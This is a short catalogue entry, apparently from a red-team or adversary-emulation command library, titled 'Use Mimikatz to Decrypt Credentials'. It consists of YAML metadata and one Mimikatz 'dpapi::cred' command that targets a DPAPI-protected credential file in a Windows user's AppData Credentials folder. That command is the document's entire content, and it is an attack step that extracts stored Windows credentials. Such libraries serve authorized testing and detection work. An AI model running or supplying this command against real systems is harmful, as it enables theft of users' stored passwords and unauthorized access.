---
id: de04a652-2813-4a5c-a26c-e01a8bbe9d54
name: Use Mimikatz to Decrypt Credentials
type: command
executor: bash
data: mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
output: null
created_at: '2023-04-06T03:56:26.276316+00:00'
updated_at: '2023-04-10T20:37:13.305156+00:00'
---

# Use Mimikatz to Decrypt Credentials

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
```
